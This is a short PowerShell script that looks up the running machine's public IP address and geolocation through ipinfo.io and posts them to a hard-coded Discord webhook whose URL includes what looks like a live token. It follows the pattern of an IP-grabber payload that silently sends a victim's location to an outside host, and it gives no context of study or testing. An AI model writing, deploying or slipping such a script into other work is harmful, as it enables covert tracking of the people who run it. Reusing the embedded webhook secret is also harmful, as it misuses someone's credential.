# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1307484158192390165/Fj0EjVersk-B9aqImHM-ZvVeF3UNvRIUavceJVJmx2uxCO2qJTV4kB93vJj8jBPheAVt"

# Get location data using ipinfo.io
$locationData = Invoke-RestMethod -Uri "https://ipinfo.io/json"

# Extract information
$ip = $locationData.ip
$city = $locationData.city
$region = $locationData.region
$country = $locationData.country
$coordinates = $locationData.loc

# Format the message
$message = "IP: $ip`nCity: $city`nRegion: $region`nCountry: $country`nCoordinates: $coordinates"

# Send the message to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message} | ConvertTo-Json -Depth 1)
